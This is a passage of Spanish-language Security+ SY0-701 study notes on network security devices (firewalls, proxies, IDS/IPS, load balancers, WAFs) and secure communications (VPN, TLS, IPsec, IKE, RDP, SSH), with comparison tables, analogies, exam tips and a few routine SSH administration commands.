| **Cómputo y capacidad de respuesta** | CPU, RAM, almacenamiento, ancho de banda | Mayores recursos = mayores costos |
| **Escalabilidad y facilidad de implementación** | Agregar/quitar recursos rápidamente | Un sistema escalable evita costos excesivos por crecimiento |
| **Disponibilidad** | Minimizar tiempo de inactividad (downtime) | Downtime = pérdida de ingresos + daño reputacional |
| **Resiliencia y facilidad de recuperación** | Reducir tiempo de recuperación ante fallos | Recuperación automática > manual |
| **Potencia** | Demandas energéticas de la instalación | Infraestructura eléctrica minimiza fallos de disponibilidad |
| **Disponibilidad de actualizaciones de seguridad** | Firmware y software protegidos contra vulnerabilidades conocidas | Si un tercero gestiona la infra, el control es limitado |
| **Transferencia de riesgos** | Contrato con tercero; SLA con penalizaciones | SLA (Service Level Agreement — Acuerdo de Nivel de Servicio) |

#### Limitaciones de las redes locales (on-premises)

- **Altos costos de capital** y **baja escalabilidad**.
- Aumentar ancho de banda (ej. 1 Gbps → 10 Gbps) puede requerir instalar cableado nuevo en todo el edificio.
- **Disponibilidad y resiliencia más bajas** que soluciones en la nube si el sitio se ve afectado por un desastre.

> **👉 Enfoque de Examen SY0-701:** CompTIA puede preguntar sobre trade-offs entre arquitecturas on-premises vs. nube. La nube generalmente ofrece mayor escalabilidad y resiliencia, mientras que on-premises ofrece mayor control. El SLA es la herramienta de transferencia de riesgos cuando se usa un tercero.

## 5.2 Dispositivos de Seguridad de la Red

### 5.2.1 Ubicación del Dispositivo

La **defensa en profundidad** se garantiza con una selección cuidadosa de la **ubicación del dispositivo** en la topología.

#### Tres opciones de ubicación y tipo de control

| Tipo de control | Ubicación típica | Función | Ejemplo |
|---|---|---|---|
| **Preventivo** | Borde del segmento/zona | Hacer cumplir políticas; garantizar CIA | Cortafuegos |
| **Detectivo** | Dentro del perímetro | Monitorear tráfico entre hosts; detectar lo que evadió el perímetro | IDS (sensor pasivo) |
| **Correctivo** | Dentro del tráfico | Corregir errores o irregularidades detectadas | Balanceador de carga (para DoS) |

#### Ejemplo de colocación en la red (de afuera hacia adentro)

1. **Cortafuegos en el borde** (control preventivo) → hace cumplir reglas de entrada/salida.
2. **Sensor IDS detrás del cortafuegos** (control detectivo) → identifica tráfico malicioso que evadió el firewall.
3. **ACLs en routers internos** (control preventivo) → controla tráfico entre zonas internas.
4. **Balanceador de carga** frente a servidores públicos (control correctivo) → mitiga DoS.
5. **Sensores en puertos espejados** (control detectivo) → detección de intrusiones en zonas sensibles.
6. **Software de protección de endpoints** en cada host → múltiples controles (antivirus, firewall de host, IDS, DLP).

> **👉 Enfoque de Examen SY0-701:** En preguntas de escenario, CompTIA pide identificar el tipo de control y su ubicación óptima. Preventivo = bloquea antes; Detectivo = alerta después; Correctivo = remedia. El balanceador de carga puede aparecer como "correctivo" por su función contra DoS — esto es un distractor frecuente ya que normalmente se asocia con disponibilidad.

### 5.2.2 Atributos del Dispositivo

#### Activo vs. Pasivo

| Atributo | Descripción | Características |
|---|---|---|
| **Pasivo** | No requiere configuración de cliente/agente ni transferencia de datos | El tráfico se dirige o copia al sensor; los hosts no saben que está funcionando; sin interfaz direccionable |
| **Activo** | Requiere configuración con credenciales y permisos; intercambia datos con hosts destino | Para filtrado: los hosts deben estar configurados para usarlo como puerta de enlace |

#### Dispositivos Inline y Métodos de Monitoreo

Un dispositivo **inline** se convierte en parte del cableado. Sus interfaces **no tienen direcciones MAC ni IP**. Puede copiar tráfico a un monitor.

| Método | Tipo | Descripción | Ventajas | Limitaciones |
|---|---|---|---|---|
| **TAP (Test Access Point — Punto de Acceso de Prueba)** | Hardware inline (L1) | Inductor/divisor óptico que copia físicamente la señal al puerto de monitoreo | Recibe TODAS las tramas (corruptas, malformadas); no afectado por carga | Requiere hardware adicional |
| **SPAN (Switched Port Analyzer — Analizador de Puerto Conmutado) / Port Mirror** | Software del switch | El switch copia tramas de puertos nominados a un puerto especial | Más fácil de implementar | No es completamente fiable; no refleja tramas con errores; puede perder tramas bajo alta carga |

#### Apertura ante Fallas vs. Cierre ante Fallas

| Modo | Descripción | Prioridad | Riesgo |
|---|---|---|---|
| **Fail-open (Apertura ante fallas)** | El acceso se conserva si hay fallo | **Disponibilidad** sobre CIA | Un atacante podría forzar el estado de falla para evadir el control |
| **Fail-closed (Cierre ante fallas)** | El acceso se bloquea; el sistema entra en el estado más seguro disponible | **CIA** sobre Disponibilidad | Tiempo de inactividad del sistema |

> Causas de fallos en dispositivos: fallo de energía/hardware (sobrecargas, sobrecalentamiento, daños físicos), errores de software (bugs, vulnerabilidades), problemas de configuración (error humano), desastres naturales.

> **👉 Enfoque de Examen SY0-701:** TAP vs. SPAN es un tema clásico. TAP = hardware, más confiable, captura todo incluyendo tramas corruptas. SPAN = software, puede perder tramas bajo carga. Para entornos de alta seguridad, TAP es preferido. Fail-open vs. fail-closed: recuerda que fail-open prioriza disponibilidad y fail-closed prioriza seguridad. CompTIA puede preguntar cuál elegir según el contexto.

### 5.2.3 Cortafuegos (Firewalls)

Un **cortafuego** es un control preventivo que hace cumplir políticas sobre el tráfico que entra y sale de una zona de red.

#### Filtrado de Paquetes con ACL

Un cortafuego de filtrado de paquetes usa una **ACL (Access Control List — Lista de Control de Acceso)** con reglas basadas en:

- **Filtrado de IP:** Dirección IP de origen o destino (también puede filtrar por MAC).
- **Tipo/ID de protocolo:** TCP, UDP, ICMP, etc.
- **Filtrado de puerto:** Puertos `TCP`/`UDP` de origen y destino.

#### Acciones del cortafuegos

| Acción | Resultado |
|---|---|
| **Accept / Allow (Aceptar/Permitir)** | El paquete pasa |
| **Drop / Deny (Caída/Denegación)** | Descarta silenciosamente el paquete |
| **Reject (Rechazo)** | Bloquea el paquete + responde al remitente con ICMP "puerto inalcanzable" |

> Las ACLs separadas filtran tráfico **entrante** y **saliente**. El control del tráfico saliente bloquea aplicaciones no autorizadas y malware como backdoors.

#### Tipos de Cortafuegos según Modo de Despliegue

| Modo | Capa OSI | Descripción | Interfaces |
|---|---|---|---|
| **Enrutado (Routed)** | L3 | Realiza reenvío entre subredes; cada interfaz = zona diferente | Dirección IP y MAC en cada interfaz |
| **Puente (Bridge)** | L2 | Inspecciona tráfico entre dos nodos; funciona como switch | Solo dirección MAC (no IP) |
| **Inline** | L1 | Actúa como segmento de cable ("bump-in-the-wire" o "cable virtual") | Sin MAC ni IP |

> Los modos inline y puente se denominan **"modos transparentes"** — no requieren reconfigurar subredes ni reasignar IPs. Ejemplo: colocar un cortafuego transparente frente a un servidor web sin cambiar su IP.

> **Nota:** Un cortafuego transparente necesita una **interfaz adicional de gestión** con dirección IP.

#### Cortafuego de Router vs. Dispositivo de Cortafuego

- **Cortafuego de dispositivo:** Hardware autónomo; cortafuego es la función principal.
- **Cortafuego de enrutador:** El enrutamiento es la función principal; el cortafuego es secundario (ej. routers SOHO domésticos).

> **👉 Enfoque de Examen SY0-701:** Los modos de despliegue del cortafuego (enrutado/puente/inline) son frecuentes en preguntas de escenario. Recuerda: modo transparente = inline o puente = sin IPs en las interfaces de datos. Las ACLs son la herramienta de configuración del filtrado. Vigilar preguntas sobre la diferencia entre "drop" (silencioso) y "reject" (responde con ICMP).

### 5.2.4 Cortafuegos de Capa 4 y 7

#### Cortafuego Sin Estado (Stateless)

- **No conserva información sobre las sesiones** de red.
- Cada paquete se analiza de forma **independiente**.
- Requiere menos esfuerzo de procesamiento.
- Vulnerable a ataques que se extienden en una **secuencia de paquetes**.
- Puede causar problemas con balance de cargas y puertos asignados dinámicamente.

#### Cortafuego de Inspección de Estado (Stateful) — Capa 4

> **Analogía:** Un cortafuego sin estado es un guardia de seguridad que revisa cada persona individualmente sin recordar quién entró antes. Un cortafuego con estado es un guardia que tiene una lista de todas las personas que ya pasaron y solo deja entrar respuestas de conversaciones ya iniciadas.

- Rastrea la información de la **sesión establecida** entre dos hosts.
- Los datos de la sesión se almacenan en una **tabla de estado**.
- Examina el **handshake de tres vías TCP**: `SYN` → `SYN/ACK` → `ACK`.
- Detecta anomalías: `SYN` sin `ACK`, anomalías en números de secuencia → indica inundaciones maliciosas o intentos de secuestro de sesión.
- Puede rastrear tráfico `UDP` (más difícil por ser sin conexión).
- También detecta anomalías en encabezados IP e ICMP.

#### Cortafuego de Capa 7 (Application Layer Firewall)

- Inspecciona **encabezados Y carga útil** de los paquetes de la capa de aplicación.
- Función clave: **verificar que el protocolo de aplicación coincida con el puerto**.
  - Ejemplo: el malware puede enviar datos TCP a través del puerto `80` — un cortafuego L7 lo detecta porque no es tráfico HTTP real.
- Ejemplo: WAF analiza encabezados HTTP y código de páginas web buscando cadenas de ataque.

#### Nombres equivalentes del cortafuego de capa 7

- Puerta de enlace de la capa de aplicación
- Inspección multicapa con estado
- Inspección profunda de paquetes (DPI — Deep Packet Inspection)

> **👉 Enfoque de Examen SY0-701:** La diferencia entre stateless, stateful y application-layer firewall es crítica. Stateless = no recuerda; Stateful = recuerda sesiones TCP; L7/DPI = inspecciona el contenido. Una pregunta clásica: ¿qué tipo de cortafuego puede detectar que un malware usa el puerto 80 para tráfico no-HTTP? Respuesta: cortafuego de capa 7. Vigilar DPI como sinónimo de inspección de capa de aplicación.

### 5.2.5 Servidores Proxy

> **Analogía:** Un servidor proxy es como un intermediario en una transacción inmobiliaria. El comprador no habla directamente con el vendedor; todo pasa a través del agente, que puede revisar, modificar o bloquear la comunicación.

Un **servidor proxy** usa un modelo de **almacenamiento y reenvío**: deconstruye cada paquete, lo analiza, lo reconstruye y lo reenvía si cumple las normas. Esto lo diferencia de un cortafuego que solo acepta o bloquea.

#### Proxies Directos (Forward Proxies)

- Gestionan tráfico **saliente** específico del protocolo.
- Ejemplo: Proxy web para puertos `TCP/80` (HTTP) y `TCP/443` (HTTPS).
- **Ventajas:** Control centralizado, motor de **caché** (almacena páginas frecuentes → ahorra ancho de banda).

| Tipo | Configuración del cliente | Uso típico |
|---|---|---|
| **No transparente** | Cliente configurado explícitamente con IP y puerto del proxy (generalmente `TCP/8080`) | Entornos corporativos controlados |
| **Transparente (forzado/interceptor)** | Sin configuración del cliente; el proxy intercepta el tráfico automáticamente | Debe implementarse como router o dispositivo inline |

- **PAC (Proxy Auto-Configuration script — Script de Configuración Automática de Proxy):** Permite al cliente configurar ajustes de proxy sin intervención del usuario.
- **WPAD (Web Proxy Auto-Discovery Protocol — Protocolo de Descubrimiento Automático del Proxy Web):** Permite a los navegadores localizar el archivo PAC.
- Ambos tipos pueden requerir **autenticación** de usuarios (posiblemente con SSO — Single Sign-On — Inicio de Sesión Único).

#### Proxies Inversos (Reverse Proxies)

- Gestionan tráfico **entrante** específico del protocolo.
- Se despliegan en el **borde de la red**.
- Escuchan solicitudes de clientes de redes públicas (Internet).
- Aplican reglas de filtrado y reenvían solicitudes aceptadas a servidores internos.

> **👉 Enfoque de Examen SY0-701:** Forward proxy vs. reverse proxy es un clásico. Forward = protege a los clientes internos al acceder a Internet. Reverse = protege a los servidores internos de las solicitudes de Internet. Distractor: el proxy transparente puede confundirse con el "modo transparente" del cortafuego — son conceptos distintos. El puerto estándar del proxy no transparente es `TCP/8080`.

### 5.2.6 Sistemas de Detección de Intrusiones

#### Sensores

- Un **NIDS (Network Intrusion Detection System — Sistema de Detección de Intrusiones en la Red)** captura tráfico a través de un **rastreador de paquetes (sniffer)** denominado **sensor**.
- El sensor puede usar un puerto **SPAN/espejo** o un **TAP** insertado.
- Se coloca habitualmente **detrás de un cortafuego** o cerca de un servidor importante.
- La cantidad de sensores depende de los recursos de la red.

#### IDS (Intrusion Detection System — Sistema de Detección de Intrusiones)

> **Analogía:** Un IDS es como una cámara de seguridad: registra y alerta, pero no interviene directamente. Observa todo el tráfico en busca de comportamientos sospechosos.

Software/dispositivos conocidos: **Snort** (`snort.org`), **Suricata** (`suricata-ids.org`), **Zeek/Bro** (`zeek.org`).

- Cuando el tráfico coincide con una **firma de detección** o **patrón heurístico**, el IDS emite una **alerta** o genera un **registro**.
- **No bloquea** el host de origen.
- El sensor pasivo **no ralentiza el tráfico** y es **indetectable** por el atacante.

**Detecciones típicas:**
- Intentos de adivinar contraseñas (brute force)
- Escaneos de puertos
- Gusanos (worms)
- Aplicaciones backdoor (puertas traseras)
- Paquetes o sesiones mal formados
- Otras violaciones de política

#### IPS (Intrusion Prevention System — Sistema de Prevención de Intrusiones)

> **Analogía:** Si el IDS es la cámara de seguridad, el IPS es el guardia de seguridad con capacidad de intervenir: puede bloquear, redirigir o expulsar a los intrusos.

- Capacidad de **respuesta activa**.
- Implementable como dispositivo **inline** con cortafuego integrado.

**Respuestas típicas del IPS:**

| Respuesta | Descripción |
|---|---|
| **Bloqueo (Shunning)** | Bloquea temporal o permanentemente el origen del tráfico no conforme |
| **Restablecimiento de conexión** | Reinicia la conexión sin bloquear la IP origen |
| **Redirección a honeypot/honeynet** | Para análisis adicional de amenazas |

> **Nota:** Tanto **Snort** como **Suricata** pueden configurarse como IPS además de IDS.

> **👉 Enfoque de Examen SY0-701:** IDS vs. IPS es uno de los temas más examinados. IDS = detecta y alerta (pasivo). IPS = detecta y responde activamente (puede estar inline). Un IPS puede reconfigurar otro dispositivo (ej. cortafuego/router) vía API o scripting para bloquear. Distractor: un IDS inline suena contradictorio — un IDS puede estar físicamente inline pero sin capacidad de bloqueo sigue siendo IDS. El honeypot como respuesta de IPS es un concepto que también aparece.

### 5.2.7 Cortafuegos de Próxima Generación (NGFW) y Administración de Amenazas Unificadas (UTM)

#### NGFW (Next-Generation Firewall — Cortafuego de Próxima Generación)

Lanzado en **2010 por Palo Alto Networks**. Sin especificación oficial, pero características típicas:

- **Filtrado de capa 7** sensible a las aplicaciones.
- **Inspección de tráfico TLS cifrado** (TLS — Transport Layer Security).
- **Integración con directorios de red** (control por usuario/rol y basado en tiempo).
- **Funcionalidad IPS integrada** (prevención de intrusiones).
- **Inspección profunda de paquetes (DPI)** y conocimiento de aplicaciones.
- **Integración con redes en la nube**.

#### UTM (Unified Threat Management — Administración de Amenazas Unificadas)

> **Analogía:** El UTM es como una navaja suiza de seguridad: tiene todas las herramientas en un solo dispositivo. El NGFW es como un bisturí quirúrgico: hace menos cosas, pero con más precisión y rendimiento.

Centraliza múltiples controles en **un solo dispositivo**:

- Cortafuego + Antimalware + IPS de red
- Filtrado de spam + Filtrado de contenido
- **DLP (Data Loss Prevention — Prevención de Pérdida de Datos)**
- **VPN (Virtual Private Network — Red Privada Virtual)**
- **CASB (Cloud Access Security Broker — Agente de Seguridad de Acceso a la Nube)**
- Protección de endpoints / escaneo de malware

#### Comparación NGFW vs. UTM

| Característica | NGFW | UTM |
|---|---|---|
| **Funciones** | Enfocado: menos funciones | Integral: todas las funciones |
| **Rendimiento** | Mejor rendimiento | Puede tener problemas de latencia bajo alta carga |
| **Mercado** | Empresas (enterprise) | PYMEs con recursos/experiencia TI limitados |
| **Riesgo** | Menor SPOF | Único punto de falla para múltiples controles |
| **Gestión** | Consolas separadas | Monitoreo y administración consolidados en una consola |

**Desventajas del UTM:**
- **Punto único de falla (SPOF):** Si cae el UTM, todos los controles fallan.
- **Latencia** bajo alta actividad de red.
- Puede no rendir tan bien como software o dispositivos especializados.

> **👉 Enfoque de Examen SY0-701:** UTM = todo en uno = riesgo de SPOF. NGFW = producto empresarial con mejor rendimiento. CompTIA puede presentar un escenario de PYME con presupuesto limitado → UTM es la respuesta correcta. Distractor: ambos pueden tener IPS, DPI y filtrado de aplicaciones — la diferencia está en el mercado objetivo y el enfoque. "UTM" y "NGFW" son parcialmente términos de marketing.

### 5.2.8 Balanceadores de Carga

> **Analogía:** Un balanceador de carga es como varios cajeros en un banco: los clientes son dirigidos al cajero disponible, por lo que si uno está ocupado o ausente, el servicio continúa.

Un **balanceador de carga** distribuye solicitudes de clientes entre nodos disponibles en una **granja o clúster de servidores**.

**Usos:** Servidores web, correo electrónico front-end, conferencias web, videoconferencias, streaming multimedia.

#### Tipos de Balanceador de Carga

| Tipo | Capa OSI | Criterio de decisión de reenvío |
|---|---|---|
| **L4 (Capa de transporte)** | 4 | Dirección IP + encabezados TCP/UDP |
| **L7 (Capa de aplicación / Content Switch)** | 7 | URL, tipo de datos (video/audio), cookies |

#### Algoritmos de Programación (Scheduling)

| Algoritmo | Descripción |
|---|---|
| **Round Robin** | Elige el próximo nodo en orden rotativo |
| **Menos conexiones** | Elige el nodo con menos conexiones activas |
| **Mejor tiempo de respuesta** | Elige el nodo más rápido |
| **Ponderado** | Aplica preferencias del administrador o datos dinámicos de carga |

#### Health Checks (Verificación de Estado)

El balanceador usa **latidos (heartbeats) o sondas** para verificar disponibilidad y carga:
- L4: solo pruebas de **conectividad básica**.
- L7: puede probar el **estado de la aplicación** y verificar disponibilidad del host.

#### Afinidad por IP de Origen y Persistencia de Sesión

- **Afinidad por IP de origen (L4):** El cliente se "pega" al nodo que primero aceptó su solicitud.
- **Persistencia de sesión (L7):** Se configura una **cookie** en el nodo o inyectada por el balanceador para mantener al cliente en la misma sesión. Más confiable que la afinidad IP, pero requiere que el navegador acepte la cookie.

> **Beneficios adicionales:** Tolerancia a fallos (si un nodo cae, el tráfico se redirige) y mitigación de ataques DoS (Denial of Service — Denegación de Servicio).

> **👉 Enfoque de Examen SY0-701:** El balanceador de carga aparece en preguntas sobre disponibilidad y mitigación de DoS. Distingue L4 (IP/puerto) de L7 (contenido/URL). La persistencia de sesión vía cookie es un concepto de capa de aplicación. Distractor: el balanceador de carga no es un dispositivo de seguridad primario, pero contribuye a disponibilidad (CIA) y puede mitigar DoS.

### 5.2.9 Cortafuegos de Aplicaciones Web (WAF)

Un **WAF (Web Application Firewall — Cortafuego de Aplicaciones Web)** protege el software en servidores web y sus bases de datos contra:
- **Ataques de inyección de código** (SQL Injection, XSS, etc.)
- **Ataques de denegación de servicio (DoS)**

#### Funcionamiento del WAF

- Usa **reglas conscientes de la aplicación** para filtrar tráfico.
- Realiza **detección de intrusiones específica** de la aplicación.
- Se programa con **firmas de ataques conocidos** y **coincidencia de patrones**.
- Bloquea solicitudes con código sospechoso.
- La salida se escribe en un **registro** que revela amenazas potenciales.

#### Implementación del WAF

- Como **dispositivo** protegiendo la zona del servidor web.
- Como **software de complemento** para la plataforma del servidor web (ej. ModSecurity para IIS/Apache/Nginx).

> **👉 Enfoque de Examen SY0-701:** El WAF es específico para proteger aplicaciones web. Si el escenario menciona SQL Injection, XSS o ataques a APIs web, la respuesta es WAF — no un cortafuego genérico. Distractor: un NGFW con DPI puede detectar algunos ataques web, pero no con la misma especificidad que un WAF dedicado. ModSecurity es el WAF de código abierto más conocido.

## 5.3 Comunicaciones Seguras

### 5.3.1 Arquitectura de Acceso Remoto

La **red de acceso remoto** significa que el dispositivo del usuario se conecta a través de una red **intermediaria** (no directamente por cable/inalámbrico a la red corporativa).

#### Topologías de VPN (Virtual Private Network — Red Privada Virtual)

| Topología | Descripción | Caso de uso | Iniciador |
|---|---|---|---|
| **Cliente a sitio (acceso remoto)** | Trabajador remoto → Gateway VPN corporativo | Teletrabajo; empleados de campo | Cliente |
| **Sitio a sitio** | Gateway VPN ↔ Gateway VPN entre dos sedes | Conectar oficinas remotas | Configuración automática |
| **Host a host** | Asegura el tráfico entre dos equipos cuando la red privada no es de confianza | Escenarios de alta seguridad punto a punto | — |

#### Protocolos VPN

- **PPTP (Point-to-Point Tunneling Protocol — Protocolo de Túnel Punto a Punto):** Obsoleto; **no ofrece seguridad adecuada**.
- **TLS (Transport Layer Security — Seguridad de la Capa de Transporte):** Actualmente preferido.
- **IPsec (Internet Protocol Security — Seguridad del Protocolo de Internet):** Actualmente preferido.

#### VPN Sitio a Sitio: Comportamiento

- Funciona **automáticamente** sin configuración en los hosts.
- Las **puertas de enlace** intercambian información de seguridad.
- La infraestructura de enrutamiento determina si el tráfico es local o va al túnel VPN.

> **👉 Enfoque de Examen SY0-701:** PPTP está obsoleto y es incorrecto como respuesta si el escenario pide seguridad. TLS e IPsec son las respuestas correctas. En VPN sitio a sitio, los hosts individuales no necesitan configuración de VPN. Distractor: "cliente a sitio" puede confundirse con la VPN del tipo "host a host" — en cliente a sitio, el cliente accede a la red corporativa; en host a host, es comunicación privada entre dos máquinas específicas.

### 5.3.2 Túnel de Seguridad de la Capa de Transporte (TLS)

#### Cómo funciona una VPN TLS

1. El cliente se conecta al servidor de acceso remoto mediante **certificados digitales**.
2. El certificado del servidor **identifica la gateway VPN** ante el cliente.
3. Opcionalmente: el cliente también tiene su propio certificado → **autenticación mutua**.
4. TLS crea un **túnel cifrado** para enviar credenciales de autenticación (procesadas por un servidor RADIUS).
5. Una vez autenticado, la gateway VPN **tuneliza todas las comunicaciones** de la LAN a través del socket seguro.

#### Protocolo de transporte para VPN TLS

| Protocolo | Ventaja |
|---|---|
| `UDP` | Mejor rendimiento; preferido para tráfico sensible a latencia (voz/video) |
| `TCP` | Más fácil de usar con políticas de cortafuego por defecto |

> **DTLS (Datagram Transport Layer Security):** TLS sobre UDP.

#### Versiones de TLS

| Versión | Estado |
|---|---|
| **TLS 1.3** | Versión más reciente; **preferida** |
| **TLS 1.2** | Compatible |
| TLS 1.1, 1.0, SSL | **Obsoletas** (deprecated) |

> **Nota:** OpenVPN (`openvpn.net`) es la implementación de VPN TLS más conocida. Puerto estándar: `UDP/1194`.

> **👉 Enfoque de Examen SY0-701:** TLS 1.3 es la versión correcta; TLS 1.0/SSL son vulnerables. Si el escenario menciona POODLE, BEAST o HEARTBLEED, están relacionados con versiones antiguas de SSL/TLS. La autenticación mutua con certificados tanto del cliente como del servidor es más segura que solo el certificado del servidor. DTLS = TLS sobre UDP.

### 5.3.3 Túnel de Seguridad del Protocolo de Internet (IPsec)

**IPsec** opera en la **capa 3 (red)** del modelo OSI → se implementa sin configurar soporte de aplicación específico e incurre en **menos sobrecarga de paquetes**.

#### Los Dos Protocolos Principales de IPsec

| Protocolo | Sigla | Función | Confidencialidad | Integridad |
|---|---|---|---|---|
| **Encabezado de Autenticación** | AH (Authentication Header) | Hash criptográfico de todo el paquete + clave secreta → genera ICV | ❌ No (carga útil no cifrada) | ✅ Sí |
| **Carga de Seguridad Encapsuladora** | ESP (Encapsulating Security Payload) | Cifra el paquete + agrega encabezado, finalizador e ICV | ✅ Sí | ✅ Sí |

> **ICV (Integrity Check Value — Valor de Verificación de Integridad):** Valor calculado para confirmar que el paquete no ha sido modificado.

> **Diferencia clave AH vs. ESP:** AH incluye el encabezado IP en el hash; ESP excluye el encabezado IP al calcular el ICV.

#### Los Dos Modos de IPsec

| Modo | Uso | Qué se cifra con ESP | AH en este modo |
|---|---|---|---|
| **Modo Transporte** | Comunicaciones entre hosts en una red privada | Solo los datos de carga útil; el encabezado IP no se cifra | Puede proporcionar integridad para el encabezado IP |
| **Modo Túnel** | VPN sitio a sitio a través de una red no segura | Todo el paquete IP original (encabezado + carga útil) encapsulado con un nuevo encabezado IP | No tiene caso de uso en modo túnel (generalmente se requiere confidencialidad) |

#### Resumen de combinaciones

```
Modo Transporte + AH  → Integridad sin cifrado (entre hosts, red confiable)
Modo Transporte + ESP → Cifrado de carga útil (entre hosts)
Modo Túnel + ESP      → Cifrado completo del paquete (VPN sitio a sitio) ← MÁS COMÚN
Modo Túnel + AH       → No tiene uso práctico (sin confidencialidad)
```

> **👉 Enfoque de Examen SY0-701:** IPsec en modo túnel con ESP es la configuración estándar para VPNs sitio a sitio. AH no cifra, solo autentica e integra. CompTIA puede presentar escenarios donde se pide elegir entre AH y ESP: si se necesita confidencialidad → ESP; si solo se necesita integridad → AH. Recuerda: AH incluye el encabezado IP en el hash; ESP no. El modo transporte es para host a host en red privada; el modo túnel es para VPN entre sitios.

### 5.3.4 Intercambio de Claves de Internet (IKE)

El protocolo **IKE (Internet Key Exchange — Intercambio de Claves de Internet)** gestiona:
- Método de **autenticación** entre pares.
- Selección de **cifrados criptográficos** compatibles.
- **Intercambio de claves**.

El conjunto de propiedades acordadas se denomina **SA (Security Association — Asociación de Seguridad)**.

#### Fases de la negociación IKE

**Fase 1:** Establece la identidad de ambos pares mediante el algoritmo **Diffie-Hellman** para crear un canal seguro.

Métodos de autenticación de pares:

| Método | Descripción |
|---|---|
| **Certificados digitales** | Emitidos por una CA (Certificate Authority — Autoridad de Certificación) de confianza mutua |
| **Clave Pre-compartida (PSK — Pre-Shared Key)** | La misma frase de contraseña configurada en ambos pares (autenticación de grupo) |

**Fase 2:** Usa el canal seguro creado en Fase 1 para establecer qué cifrados y tamaños de clave se usarán con AH o ESP en la sesión IPsec.

#### Versiones de IKE

| Versión | Características | Topología principal |
|---|---|---|
| **IKEv1** | Original; requiere protocolo de soporte para VPN de acceso remoto | Sitio a sitio, host a host |
| **IKEv2** | Soporta métodos de autenticación **EAP** (contra servidor RADIUS); modo de configuración simple; recorrido **NAT (NAT traversal)**; **MOBIKE** (multiconexión para smartphones) | Acceso remoto cliente a sitio |

> **MOBIKE:** Permite que un smartphone mantenga la conexión IPsec activa al cambiar entre interfaces Wi-Fi y celular.

> **👉 Enfoque de Examen SY0-701:** IKEv2 es preferible para VPN de acceso remoto porque soporta EAP/RADIUS para autenticación de usuarios. La PSK es más fácil de configurar pero menos segura que los certificados. Diffie-Hellman aparece en la Fase 1 de IKE — es el algoritmo que establece el canal seguro inicial. Vigilar: la SA es el resultado del proceso IKE, no el proceso en sí.

### 5.3.5 Escritorio Remoto

#### RDP (Remote Desktop Protocol — Protocolo de Escritorio Remoto)

- Protocolo de **Microsoft** para acceso gráfico remoto a máquinas físicas individuales.
- Envía **datos de pantalla y audio** desde el host remoto al cliente.
- Transfiere **entrada de mouse y teclado** del cliente al host remoto.
- Las conexiones RDP están **cifradas por defecto**.
- **Puerto estándar:** `TCP/3389`.

#### Alternativas y soluciones complementarias

| Solución | Descripción |
|---|---|
| **VNC (Virtual Network Computing)** | Múltiples proveedores (ej. RealVNC) |
| **TeamViewer** | Solución comercial multiplataforma |
| **Puerta de enlace de escritorio remoto** | Facilita acceso a escritorios virtuales o aplicaciones individuales en servidores de la red |

**Plataformas soportadas generalmente:** Windows, macOS, iOS, Linux, Chrome OS, Android.

#### VPN HTML5 / Puerta de enlace sin cliente

> **Tecnología:** El elemento `canvas` de **HTML5** permite a un navegador dibujar y actualizar un escritorio con bajo retraso. También maneja audio.
> **Protocolo:** **WebSockets** → mensajes bidireccionales sin la sobrecarga de peticiones HTTP separadas.
> **Ejemplo:** Apache Guacamole (`guacamole.apache.org`).

- No requiere aplicación cliente dedicada.
- Acceso remoto solo con un navegador web.

> **👉 Enfoque de Examen SY0-701:** RDP = puerto `TCP/3389` = cifrado por defecto. La puerta de enlace HTML5/sin cliente es la solución cuando no se puede instalar software en el cliente. WebSockets es el protocolo que habilita la comunicación bidireccional en tiempo real en HTML5. Distractor: VNC no está cifrado por defecto en todas las implementaciones — RDP sí.

### 5.3.6 Shell Seguro (SSH)

**SSH (Secure Shell — Shell Seguro)** es el principal medio para acceso remoto seguro a un **terminal de línea de comandos**.

**Puerto estándar:** `TCP/22`.
**Usos principales:** Administración remota, **SFTP (Secure File Transfer Protocol — Protocolo de Transferencia Segura de Archivos)**.
**Implementación más usada:** OpenSSH (`openssh.com`).

#### Identificación de Servidores SSH

- Los servidores SSH se identifican mediante **pares de claves públicas/privadas** denominadas **claves del host**.
- El cliente puede asignar manualmente nombres de host a claves de host.
- Si la clave privada del servidor está comprometida → el atacante puede **suplantar el servidor** (ataque MITM — Man-In-The-Middle).
- **La clave del host debe cambiarse** si se sospecha compromiso.

#### Métodos de Autenticación del Cliente SSH

(Configurados en `/etc/ssh/sshd_config` en el servidor):

| Método | Descripción |
|---|---|
| **Usuario/Contraseña** | El servidor SSH verifica contra base de datos local o servidor RADIUS |
| **Autenticación de clave pública** | La clave pública del usuario remoto se agrega a la lista de claves autorizadas de la cuenta local en el servidor |
| **Kerberos** | El cliente envía credenciales Kerberos (TGT — Ticket Granting Ticket) obtenidas al conectarse; el servidor SSH valida con el servicio de concesión de tickets (KDC/controlador de dominio Windows) vía **GSSAPI (Generic Security Services Application Programming Interface)** |

#### Comandos SSH Clave

```bash
# Conectarse a 10.1.0.10 como usuario "bobby" (autenticación con contraseña)
ssh bobby@10.1.0.10

# Generar un nuevo par de claves RSA
ssh-keygen -t rsa

# Copiar la clave pública al servidor remoto
ssh-copy-id bobby@10.1.0.10

# Copiar un archivo desde el servidor remoto al host local
scp bobby@10.1.0.10:/logs/audit.log audit.log

# Copiar un directorio recursivamente
scp -r bobby@10.1.0.10:/logs/ ./logs_backup/
```

#### Gestión de Claves Públicas — Consideraciones de Seguridad

- **Tarea crítica:** Administrar las claves públicas válidas de los clientes.
- Si una clave privada de usuario se ve comprometida:
  1. **Eliminar** la clave pública del servidor SSH.
  2. **Re-generar** el par de claves en el dispositivo cliente.
  3. **Copiar** la nueva clave pública al servidor SSH.
- **Siempre eliminar** las claves públicas cuando se revocan permisos de acceso del usuario.

> **👉 Enfoque de Examen SY0-701:** SSH es fundamental. Puerto `TCP/22`. La autenticación de clave pública es más segura que usuario/contraseña. Un ataque MITM en SSH se mitiga verificando la huella digital (fingerprint) de la clave del host. `scp` usa SSH para transferencia segura de archivos — a diferencia de `FTP` (inseguro) o `SFTP` que también usa SSH. Vigilar: si una clave privada se compromete, la clave pública en el servidor debe eliminarse inmediatamente.

### 5.3.7 Gestión Fuera de Banda y Servidores de Salto

#### SAW (Secure Administrative Workstation — Estación de Trabajo Administrativa Segura)

- Estaciones de trabajo dedicadas para administración remota.
- Solo con software necesario: navegador mínimo, cliente SSH, cliente RDP.
- **Acceso a Internet denegado** o restringido a sitios de proveedores aprobados (parches/soporte).
- Sujetas a **control de acceso riguroso** y **auditorías**.

#### Gestión en Banda vs. Fuera de Banda

| Tipo | Descripción | Cifrado requerido | Costo/Complejidad |
|---|---|---|---|
